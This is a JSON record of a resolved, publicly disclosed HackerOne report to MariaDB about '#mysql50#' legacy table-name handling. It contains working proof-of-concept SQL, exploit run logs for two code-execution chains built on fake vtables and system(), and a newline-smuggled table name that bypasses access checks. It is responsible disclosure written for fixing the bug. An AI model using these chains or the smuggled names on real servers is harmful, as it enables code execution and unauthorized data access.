@@ -1,0 +1,104 @@
+{
+  "id": 3849051,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODQ5MDUx",
+  "url": "https://hackerone.com/reports/3849051",
+  "title": "#mysql50# legacy alias / internal table collisions",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-07T17:24:50.500Z",
+  "submitted_at": "2026-07-07T17:24:50.668Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vortfu",
+    "url": "/vortfu",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-07T19:48:18.484Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-09-07T19:48:16.134Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> **Note:** a working (but heavily vibecoded mess of a) remote code execution chain for this issue is available.\n> I recommend not posting anything publicly accessible about this in JIRA until resolved.\n\nWhile the previous `#mysql50#` report (https://hackerone.com/reports/3849040) focused on exploiting issues relating to stale cache entries that are keyed by table name, this issue focuses more on the filesystem side of things and how `tablename_to_filename()` encoding differences can be abused.\n\n[sql/sql_table.cc:518](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/sql/sql_table.cc#L518-L550)\n```c++\nuint tablename_to_filename(const char *from, char *to, size_t to_length)\n{\n  if ((length= check_n_cut_mysql50_prefix(from, to, to_length)))\n  { \n    if (Lex_ident_table::check_name({to, length}, true))\n    {\n      to[0]= 0;\n      length= 0;\n    }\n    DBUG_RETURN(length);\n  }\n\n  length= strconvert(system_charset_info, from, FN_REFLEN,\n                     &my_charset_filename, to, to_length, &errors);\n  if (check_if_legal_tablename(to) &&\n      length + 4 < to_length)\n  {\n    memcpy(to + length, \"@@@\", 4);\n    length+= 3;\n  }\n  DBUG_RETURN(length);\n}\n```\n\nTrue to its name, `check_n_cut_mysql50_prefix()` checks the table name for the `#mysql50#` prefix, removes it if present (`to`) and we fall into that first conditional block (this is the part we care about) - otherwise names get converted normally in the modern format. e.g. `foo/bar > foo@002fbar`.\n\n`Lex_ident_table::check_name()` wraps `Lex_ident_fs::check_body()` which then essentially does the following:\n\n[sql/table.cc:5423](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/sql/table.cc#L5423-L5465)\n```c++\nbool Lex_ident_fs::check_body(const char *name, size_t length,\n                              bool disallow_path_chars)\n{\n  ..\n  for ( ; name != end ; char_length++)\n  {\n    ...\n    if (disallow_path_chars &&\n        (*name == '/' || *name == '\\\\' || *name == '~' || *name == FN_EXTCHAR))\n      return 1;\n\n    if (*name == 0x00)\n      return 1;\n    name++;\n  }\n  return char_length > NAME_CHAR_LEN;\n}\n```\n\nThus anything other than `/`, `\\`, `~`, `.`, or NULL is essentially fair game in a `#mysql50#` prefixed table name. Because no encoding takes place, which is sort of the whole reason for this special-case handling to begin with, prefixed table names may be used to create, access, or alter internal / storage-engine \"reserved\" db related files.\n\nThe biggest problem is with having unencoded `#` chars in a `#mysql50#`-prefixed table name, which allows an attacker to collide with things such as the following (probably non-comprehensive list):\n\n- `#sql*`,\n- `#rocksdb*`,\n- `#cache#` (ColumnStore)\n- `<table>#P#<partition>`\n - `<table>#P#<partition>#TMP#`\n - `<table>#P#<partition>#REN#`\n - `<table>#P#<partition>#SP#<subpartition>`\n- `<table>#i#<NN>`\n- etc\n\nThere may also be some non-`#` related storage-engine issues such as tables colliding with `FTS_*` auxiliary-looking InnoDB names, e.g.\n- `FTS_<table_id>_CONFIG`\n- `FTS_<table_id>_<index_id>_INDEX_1`\n\nOr table names that include control characters which can corrupt internal settings in things like merge tables and allow for ACL bypasses, e.g.\n- `foo\\nbar`\n\nOr ... other weird and wonderful things? :shrug:\n\n\n## Suggested Fix\n\nCodex suggests the following (in order of preference)\n- remove `#mysql50#` support completely\n- allow, but only for opening existing legacy files and explicit `ALTER DATABASE ... UPGRADE DATA DIRECTORY NAME`\n- otherwise reject anything containing control bytes or internal marker grammer (or maybe just `#`?).\n\n\n## Proof of Concept - `#sql*` (hidden tables)\n\n```sql\n-- file names get encoded\nCREATE TABLE `#sql-visible`(a INT);\nINSERT INTO `#sql-visible` VALUES (1);\n\n-- file names do not get encoded (and can be used directly afterwards)\nCREATE TABLE `#mysql50##sql-hidden`(a INT);\nINSERT INTO `#sql-hidden` VALUES (2);\n\n-- non-encoded tables are treated as special\nSHOW TABLES;\n-- +------------------+\n-- | #sql-visible     |\n-- +------------------+\n\nSELECT * FROM `#sql-visible`;\n-- +------+\n-- |    1 |\n-- +------+\n\nSELECT * FROM `#sql-hidden`;\n-- +------+\n-- |    2 |\n-- +------+\n```\n\n## Proof of Concept - `<table>#P#<partition>` (RCE)\n\nWhen weaponized with ASLR bypass / read-what-where / write-what-where primitives from the other `#mysql50#` report (or elsewhere), an attacker can use a partition physical-table schema mismatch as the final memory-corruption and dispatch primitive.\n\nThe attacker creates a normal partitioned MyISAM parent table with a small parent record field, releases the partition handles, then drops and re-creates the hidden physical partition table (`#mysql50#<parent>#P#p0`) with a much larger compatible-looking row field. When the parent partition is read, `ha_partition` materializes the physical child row into the parent table’s record buffer using mismatched child metadata, overflowing past the parent row buffer into adjacent live `Field` objects.\n\nThe complete-chain PoC overwrites a reachable `Field` vtable pointer, stages a fake vtable, and dispatches through `Field::val_int()` via a parent-table `SELECT`.\n\n```\n==============================================================================\nMariaDB: #mysql50# partition physical-table record overflow\nvortfu <vort.fu@gmail.com>\n\ntarget=11.8.8-MariaDB-deb13/aarch64 release build=450e330a\n==============================================================================\n\n...\n\n[*] bypassing ASLR\n[-] recovering image base via MEMORY inverse leak\n[+] image_base=0xaaaac5fb0000\n[-] verify: image base readback\n[-] readback @base head=7f454c46020101030000000000000000\n[-] verdict ELF64_OK\n\n[*] arming partition physical-table replacement\n[-] parent=`testdb`.`part_mysql50_ad450e8b` parent.c=VARBINARY(8)\n[-] physical=`testdb`.`#mysql50#part_mysql50_ad450e8b#P#p0` physical.c=VARBINARY(65504) actual_payload=65504 engine=MyISAM\n[>] mysql> CREATE TABLE `testdb`.`part_mysql50_ad450e8b`(\n        id INT NOT NULL,\n        c VARBINARY(8),\n        PRIMARY KEY(id)\n    ) ENGINE=MyISAM\n    PARTITION BY RANGE(id)(\n        PARTITION p0 VALUES LESS THAN (10),\n        PARTITION p1 VALUES LESS THAN MAXVALUE\n    )\n[>] mysql> INSERT INTO `testdb`.`part_mysql50_ad450e8b` VALUES(1,'orig0'),(20,'orig1')\n[>] mysql> ALTER TABLE `testdb`.`part_mysql50_ad450e8b` COMMENT='release partition handles'\n[>] mysql> DROP TABLE `testdb`.`#mysql50#part_mysql50_ad450e8b#P#p0`\n[>] mysql> CREATE TABLE `testdb`.`#mysql50#part_mysql50_ad450e8b#P#p0`(\n        id INT NOT NULL,\n        c VARBINARY(65504),\n        PRIMARY KEY(id)\n    ) ENGINE=MyISAM\n[>] mysql> INSERT INTO `testdb`.`#mysql50#part_mysql50_ad450e8b#P#p0` VALUES(1, <payload 65504 bytes>)\n[>] mysql> SELECT LENGTH(c) AS physical_len, HEX(SUBSTR(c,1,16)) AS physical_head FROM `testdb`.`#mysql50#part_mysql50_ad450e8b#P#p0`\n    physical_len=65504 physical_head=504152544D5953514C3530504152544D\n\n[*] probing partition parent TABLE layout\n[>] mysql> LOCK TABLE `testdb`.`part_mysql50_ad450e8b` READ\n[+] parent TABLE=0xaaaaf1bb60e8 share=0xf7ff8402cb80 handler=0xf7ff84030358\n[+] record0=0xf7ff84031ce0 record1=0xf7ff84031cf0 record2=0xf7ff84031cf0\n[+] TABLE::field=0xf7ff84031d00 delta_from_record0=+0x20\n[+] share.reclength=14 share.rec_buff_length=16 fields=2\n    field[0] Field=0xf7ff84031da0 vptr=0xaaaac77416b0 ptr=0xf7ff84031ce1 table=0xaaaaf1bb60e8 len=11 idx=0 delta_field=+0xc0 delta_data=+0xbe\n    field[1] Field=0xf7ff84031e70 vptr=0xaaaac7747e58 ptr=0xf7ff84031ce5 table=0xaaaaf1bb60e8 len=8 idx=1 delta_field=+0x190 delta_data=+0x18a\n[+] partition payload start for c=0xf7ff84031ce7 c_Field_delta=+0x189 verdict=FORWARD_REACHABLE\n[-] target candidate field[0] delta_from_payload=+0xb9 reachable\n[-] target candidate field[1] delta_from_payload=+0x189 reachable\n\n[*] staging patched fake vtable\n[+] fake vtable call target=system_pivot(image+0x73b6e0 -> libc system) addr=0xaaaac66eb6e0\n[-] partition dispatch target field[0] patched_slots={val_int+0xc8}\n[-] target Field[0] real_vtable=0xaaaac77416b0\n[-] system_pivot cmd='id>/tmp/p50rce' system=0xffffbbdd9380\n[-] stage table=`testdb`.`part_field_stage` TABLE=0xf7ff881c4f68 record0=0xf7ff8b03bc60\n[+] cloned real target vtable=0xaaaac77416b0 len=0x400\n[+] fake_vtable=0xf7ff8b040100 patched_slots={val_int+0xc8} -> 0xaaaac66eb6e0\n[+] verify fake_vtable[0xc8]=0xaaaac66eb6e0\n[+] payload base cloned live memory range 0xf7ff84031ce7..0xf7ff84031e80 len=409\n[+] partition payload overwrites target Field[0] at payload+0xb9 Field=0xf7ff84031da0 data_start=0xf7ff84031ce7\n[+] payload_len=409 fake_vtable=0xf7ff8b040100\n[>] mysql> UPDATE `testdb`.`#mysql50#part_mysql50_ad450e8b#P#p0` SET c=<payload 409 bytes> WHERE id=1\n[>] mysql> SELECT LENGTH(c) AS physical_len, HEX(SUBSTR(c,1,16)) AS physical_head FROM `testdb`.`#mysql50#part_mysql50_ad450e8b#P#p0`\n    physical_len=409 physical_head=00000000000000000000000000000000\n\n[*] triggering partition Field-vptr dispatch path\n[-] execute mode: expect command 'id>/tmp/p50rce' and clean query return for val_int mode\n\n[*] triggering returnable Field-vptr dispatch\n[-] execute mode: server should remain alive after val_int dispatch\n[-] triggering parent partition read; payload_len=65504\n[-] complete-chain trigger uses id+0 to dispatch Field[0]->val_int() after metadata\n[>] mysql> SELECT id + 0 AS dispatched_val_int\n            FROM `testdb`.`part_mysql50_ad450e8b` PARTITION(p0)\n            LIMIT 1\n    0\n[+] execute trigger returned cleanly\n[*] summary\n[+] partition replacement primitive reached parent record materialization\n[-] artifacts left in testdb: part_mysql50_ad450e8b and #mysql50#part_mysql50_ad450e8b#P#p0\n```\n\n```\n-rw-rw---- 1 mysql mysql 48 Jul  6 21:37 /tmp/p50rce\nuid=101(mysql) gid=104(mysql) groups=104(mysql)\n```\n\n\n## Proof of Concept - `#i#<NN>` (RCE)\n\nWhen weaponized with ASLR bypass / read-what-where / write-what-where primitives from the other `#mysql50#` report (or elsewhere), an attacker can use the VECTOR HLINDEX hidden-helper table as the final dispatch gadget by planting a fake `Field/vtable`, re-creating the table with mismatched schema such that `graph->field[2]` now points to the fake field, and then dispatching `graph->field[2]->value_length()` through the fake vtable via `MHNSW_Share::acquire()` [#](https://github.com/MariaDB/server/blob/fd8cec54af7a9d79749df25ea70dac695b371641/sql/vector_mhnsw.cc#L861-L896)\n\n```\n==============================================================================\nMariaDB: #mysql50# VECTOR HLINDEX hidden-helper Field vptr dispatch\nvortfu <vort.fu@gmail.com>\n\ntarget=11.8.8-MariaDB-deb13/aarch64 build=450e330a\n==============================================================================\n\n...\n\n[*] bypassing ASLR\n[-] recovering image base via MEMORY inverse leak\n[+] image_base=0xaaaac3de0000\n[-] verify: image base readback\n[-] readback @base head=7f454c46020101030000000000000000\n[-] verdict ELF64_OK\n\n[*] staging external fake Field/vtable\n[+] fake vtable call target=system_pivot(image+0x73b6e0 -> libc system) addr=0xaaaac451b6e0\n[-] vector call site is graph->field[2]->value_length() slot+0x150\n[-] system_pivot cmd='id>/tmp/v50rce' cmd_addr=0xf7ff38a12cb0 system=0xffff84b09380\n[-] stage table=`testdb`.`vec_field_stage` TABLE=0xf7ff5e192148 record0=0xf7ff38a12b80\n[+] fake_field=0xf7ff38a12c00 fake_vtable=0xf7ff38a12f00 vector_slot+0x150=0xaaaac451b6e0\n[+] verify fake_field.vptr=0xf7ff38a12f00 fake_vtable[0x150]=0xaaaac451b6e0\n[+] verify system_pivot cmd_head=69643e2f746d702f7635307263650000 target=0xffff84b09380\n\n[*] preparing vector hidden-helper slot overwrite\n[>] mysql> CREATE TABLE `testdb`.`vec_field_chain`(\n        id INT PRIMARY KEY,\n        v VECTOR(3) NOT NULL,\n        VECTOR KEY(v) m=3\n    ) ENGINE=MyISAM\n[>] mysql> INSERT INTO `testdb`.`vec_field_chain` VALUES (1,VEC_FromText('[1,2,3]'))\n[>] mysql> ALTER TABLE `testdb`.`vec_field_chain` COMMENT='release hidden handle'\n[>] mysql> DROP TABLE `testdb`.`#mysql50#vec_field_chain#i#01`\n[>] mysql> CREATE TABLE `testdb`.`#mysql50#vec_field_chain#i#01`(\n        layer VARBINARY(255) NOT NULL,\n        tref VARBINARY(6),\n        vec BLOB NOT NULL,\n        neighbors BLOB NOT NULL,\n        UNIQUE(tref),\n        KEY(layer(1))\n    ) ENGINE=MyISAM\n[>] mysql> INSERT INTO `testdb`.`#mysql50#vec_field_chain#i#01` VALUES (<layer payload>, X'000000000000', <vec>, X'00')\n[>] mysql> SELECT LENGTH(layer) AS layer_len, HEX(SUBSTR(layer,79,8)) AS target_slot_le FROM `testdb`.`#mysql50#vec_field_chain#i#01`\n    layer_len=255 target_slot_le=002CA138FFF70000\n[+] vector helper payload_len=255 slot_offset=0x4e fake_field=0xf7ff38a12c00\n\n[*] triggering vector dispatch path\n[-] system_pivot mode: expect command 'id>/tmp/v50rce' before connection loss/crash\n[>] mysql> INSERT INTO `testdb`.`vec_field_chain` VALUES (2,VEC_FromText('[2,3,4]'))\n[-] chain failed: SQLSTATE[HY000]: General error: 2006 MySQL server has gone away\n```\n\n```\n-rw-rw---- 1 mysql mysql 48 Jul  6 19:31 /tmp/v50rce\nuid=101(mysql) gid=104(mysql) groups=104(mysql)\n```\n\n\n## Proof of Concept - `MRG_MYISAM` (ACL Bypass)\n\nAssuming the following setup (and a separate attacker controlled db):\n\n```sql\nCREATE DATABASE victim;\nGRANT CREATE TEMPORARY TABLES ON `victim`.* TO 'vortfu'@'localhost';\n\nCREATE TABLE victim.secret(id INT, data LONGTEXT) ENGINE=MYISAM;\nINSERT INTO victim.secret VALUES (1, 'foo-secret-bar');\n```\n\nAn attacker can create two tables in their own db:\n- `testdb`.`x` and\n- `testdb`.`#mysql50#x\\n#INSERT_METHOD=LAST\\nsecret`\n\nWhen they create a temporary table on `victim` that merges with `testdb`.`#mysql50#x\\n#INSERT_METHOD=LAST\\nsecret`, permission checks are performed against the latter, but the storage-engine will store / read child tables as being newline delimited.\n\n[storage/myisammrg/myrg_create.c:42](https://github.com/MariaDB/server/blob/fd8cec54af7a9d79749df25ea70dac695b371641/storage/myisammrg/myrg_create.c#L42-L52)\n```c\nint myrg_create(const char *name, const char **table_names,\n                uint insert_method, my_bool fix_names)\n{\n  ...\n  strmov(buff,*table_names);\n  *(end=strend(buff))='\\n';\n  mysql_file_write(file, (uchar*) buff, (uint) (end-buff+1), ...);\n```\n\n[storage/myisammrg/myrg_open.c:65](https://github.com/MariaDB/server/blob/fd8cec54af7a9d79749df25ea70dac695b371641/storage/myisammrg/myrg_open.c#L65-L72)\n```c\nMYRG_INFO *myrg_open(const char *name, int mode, int handle_locking)\n{\n  ...\n  while ((length=my_b_gets(&file,buff,FN_REFLEN-1)))\n  {\n    ...\n    if (buff[0] && buff[0] != '#')\n      files++;\n  }\n  ...\n\n  while ((length=my_b_gets(&file,buff,FN_REFLEN-1)))\n  {\n    ...\n    if (buff[0] == '#')\n    {\n      if (!strncmp(buff+1,\"INSERT_METHOD=\",14))\n        found_merge_insert_method =\n          (uint) find_type(buff + 15, &merge_insert_method, FIND_TYPE_BASIC);\n      continue;\n    }\n```\n\nand thus the table actually merges `testdb`.`x` and `victim`.`secret`, e.g.\n\n```sql\nSELECT * FROM victim.secret;\n--ERROR 1142 (42000): SELECT command denied to user 'vortfu'@'localhost' for table `victim`.`secret`\n\nCREATE OR REPLACE TABLE testdb.x(id INT, data LONGTEXT) ENGINE=MYISAM;\nCREATE OR REPLACE TABLE testdb.`#mysql50#x\n#INSERT_METHOD=LAST\nsecret`(id INT) ENGINE=MYISAM;\n\nCREATE OR REPLACE TEMPORARY TABLE victim.m(id INT, data LONGTEXT)\nENGINE=MRG_MYISAM\nUNION=(testdb.`#mysql50#x\n#INSERT_METHOD=LAST\nsecret`);\n\nSELECT * FROM victim.m;\n-- +------+----------------+\n-- | id   | data           |\n-- +------+----------------+\n-- |    1 | foo-secret-bar |\n-- +------+----------------+\n```\n\n**Note:** a case-sensitive fs (`@@lower_case_table_names=0`) is needed to allow `INSERT` on the victim table, otherwise the `#INSERT_METHOD=` directive is lower-cased and ignored.  `SELECT`, `UPDATE`, and `DELETE` should be able to work without it regardless.\n\n## Impact\n\nalso pwned :(",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-07T19:48:16.584Z",
+  "allow_singular_disclosure_after": -4855.824288744,
+  "singular_disclosure_allowed": true,
+  "vote_count": 0,
+  "voters": [],
+  "structured_scope": {
+    "databaseId": 10334,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Remote Code Execution",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
